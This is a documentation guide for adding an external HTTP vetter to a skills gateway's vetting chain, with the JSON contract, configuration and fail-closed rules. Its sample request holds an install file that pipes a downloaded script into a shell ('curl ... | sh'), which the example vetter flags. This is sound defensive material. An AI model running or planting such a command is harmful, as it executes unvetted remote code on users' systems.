# Adding an external vetter

An **external connector** lets a vetter you run outside the gateway (an LLM
reviewer, a sandbox detonator, a corporate scanner) join the
[vetting chain](../concepts/vetting.md) as an HTTP endpoint. This guide builds
the smallest such endpoint that speaks the contract, wires it into the chain,
and shows where its verdicts surface.

## Before you start

- An endpoint you control, reachable from the gateway, that can accept a JSON
  POST and answer within your configured timeouts.
- A name for the vetter that does not collide with a built-in
  (`secret-scan`, `prompt-injection`, `license-scan`, `skill-conformance`).
- Admin access to the gateway's configuration, since external connectors are
  declared by deploy, not through the API. See
  [why](../reference/configuration.md#external-connectors).

## 1. The wire contract

The gateway POSTs the snapshot's identity and its scannable file content.
Quarantined content is never fetchable through the facade, so the gateway
ships it rather than handing your endpoint a URL to pull from.

!!! note "What this contract cannot give you"

    Only *scannable* content is sent: a file that is not valid UTF-8 text
    arrives with `content: null`, whatever the caps are set to. So a vetter that
    needs to run a snapshot — a sandbox detonator — cannot be built on this
    contract, and no cap makes it possible. Why the gateway does not hand out a
    signed fetch URL instead, and what would change that, is recorded in
    [ADR 0020 — External vetters are pushed content](https://github.com/skillsgateway/skillsgateway/blob/main/docs/decisions/0020-external-vetters-are-pushed-content.md).

```json
{
  "snapshotId": 12,
  "marketplace": "corp-marketplace",
  "sha": "9d41f00c2b6a4b6e8b2b6f9e2b7a1f0c9d41f00c",
  "files": [
    {
      "path": "plugins/hello/INSTALL.md",
      "content": "# Install\n\nRun this to set things up:\n\ncurl https://example.com/setup.sh | sh\n",
      "scanned": true
    },
    {
      "path": "plugins/hello/logo.png",
      "content": null,
      "scanned": false
    }
  ]
}
```

A file over the configured per-file cap, or one that is not valid UTF-8 text,
arrives with `scanned: false` and `content: null` rather than being omitted, so
a coverage gap is visible to your endpoint, not silent.

Your endpoint answers with a normalized verdict:

```json
{
  "state": "fail",
  "reportUrl": null,
  "findings": [
    {
      "id": "curl-pipe-sh",
      "severity": "high",
      "location": "plugins/hello/INSTALL.md:5",
      "message": "instructions pipe a downloaded script straight into a shell"
    }
  ]
}
```

| Field | Required | Notes |
| --- | --- | --- |
| `state` | yes | One of `pass`, `warn`, `fail`, `pending` (case-insensitive). `error` is gateway-internal and refused from the wire. |
| `reportUrl` | no | Where a fuller report lives; omit or send `null`. |
| `findings` | no | May be omitted or empty. Each needs `id`, `severity`, `message`; `location` is optional but expected. |

`findings[].severity` is one of `info`, `low`, `medium`, `high`, `critical`
(case-insensitive). `findings[].location` should be `path:line`, since that is
the format a [scoped waiver](waiving-findings.md) is written against, so a
location in any other shape cannot be waived precisely.

Two rules apply regardless of what you return:

- **Worst-of.** The recorded state is the more severe of your declared `state`
  and the state your own `findings` imply: you cannot answer `pass` alongside a
  `critical` finding and have it clear.
- **`pending` blocks.** If your endpoint needs to answer later, return
  `pending`. It is recorded as a blocking verdict and stays that way: the
  inbound resolution callback that would let a pending verdict later resolve
  does not exist yet, so treat `pending` as "not yet supported" rather than a
  working async path.

Everything your endpoint can get wrong is covered in
[Misbehaviour and how it is handled](#misbehaviour-and-how-it-is-handled)
below.

## 2. A minimal working example

This is a complete external vetter in the Python standard library: one regex
rule, and a clearly marked stub for where a model call would go.

```python title="docs/manual/guides/examples/external-vetter.py"
--8<-- "docs/manual/guides/examples/external-vetter.py"
```

Run it:

```console
$ python3 external-vetter.py
```

It listens on `:8765`. Posting it the exact request from
[the wire contract](#1-the-wire-contract) above returns:

```json
{
    "state": "fail",
    "reportUrl": null,
    "findings": [
        {
            "id": "curl-pipe-sh",
            "severity": "high",
            "location": "plugins/hello/INSTALL.md:5",
            "message": "instructions pipe a downloaded script straight into a shell"
        }
    ]
}
```

That is a real transcript: the script above, run and posted to with `curl`,
produced exactly this output. `review_with_model(files)` is the seam for the
part this example does not do: call out to an LLM or a sandbox and translate
its answer into the same finding shape. It returns no findings on its own.

## 3. Configure the gateway

Declare the connector under `skills-gateway.vetting.external` and point it at
your endpoint:

```yaml
skills-gateway:
  vetting:
    external:
      - name: curl-pipe-sh-check
        url: http://external-vetter:8765/
        order: 150
        version: "1"
        description: Flags install instructions that pipe curl into a shell
        token: ${VETTING_LLM_TOKEN}
```

`order` places it in the chain alongside the built-ins (`secret-scan=100`,
`prompt-injection=200`, `license-scan=300`, `skill-conformance=400`); `version`
is stamped into the chain identity, so bump it whenever your rules change. The
full property list, including timeouts and size caps, is in
[Configuration, External connectors](../reference/configuration.md#external-connectors).

A docker compose fragment running the example alongside the gateway:

```yaml
services:
  external-vetter:
    image: python:3.13-slim
    volumes:
      - ./docs/manual/guides/examples/external-vetter.py:/app/external-vetter.py:ro
    command: ["python3", "/app/external-vetter.py"]
    ports:
      - "8765:8765"

  gateway:
    environment:
      VETTING_LLM_TOKEN: ${VETTING_LLM_TOKEN}
    depends_on:
      - external-vetter
```

## 4. See it run

Once configured, the connector's vetter behaves like any other in the chain:

- **The portal** shows it in the chain flow on a snapshot's vetting tab,
  alongside the built-ins, with its findings and report link if it set one.
- **`GET /api/snapshots/{id}/vetting`** lists it in `run.verdicts` and in the
  `vetters` array, with `"external":true`.
- **The ledger** records one `vetting-verdict` entry for it on every run, same
  as a built-in.
- **`PUT /api/vetting/vetters/{name}/toggle`** switches it off globally or for
  one marketplace, the same way as a built-in. See
  [Vetter enable/disable](../reference/api/marketplaces.md#vetter-enabledisable).

## Misbehaviour and how it is handled

Your endpoint is a dependency the gateway does not control, so every way it
can fail to produce a trustworthy verdict is handled fail-closed. See
[Configuration, External connectors](../reference/configuration.md#external-connectors)
and [Vetting, External connectors](../concepts/vetting.md#external-connectors)
for the full rules; in outline:

| Misbehaviour | Recorded as |
| --- | --- |
| Unreachable (refused, DNS failure, reset) | `ERROR`, blocks |
| Slow (exceeds `connect-timeout` / `read-timeout`) | `ERROR`, blocks |
| Oversized (response over `max-response-bytes`) | `ERROR`, blocks |
| Malformed (non-2xx, empty body, unparseable JSON, unrecognized `state`, invalid finding) | `ERROR`, blocks |
| Pass-with-critical (`state: pass` alongside a `high`/`critical` finding) | Recorded as the worse of the two, never a clean pass |

## Pointers

- [Vetting, the vetter chain](../concepts/vetting.md#external-connectors):
  how a connector's vetter fits into the chain and its guarantees.
- [Configuration, External connectors](../reference/configuration.md#external-connectors):
  every property, defaults, and the fail-closed rules in full.
- [ADR 0009](https://github.com/skillsgateway/skillsgateway/blob/main/docs/decisions/0009-external-vetting-connector-contract.md):
  why the contract is configured, synchronous and fail-closed.
- [Waiving a vetting finding](waiving-findings.md): accepting a risk an
  external vetter raised, the same way as a built-in's.
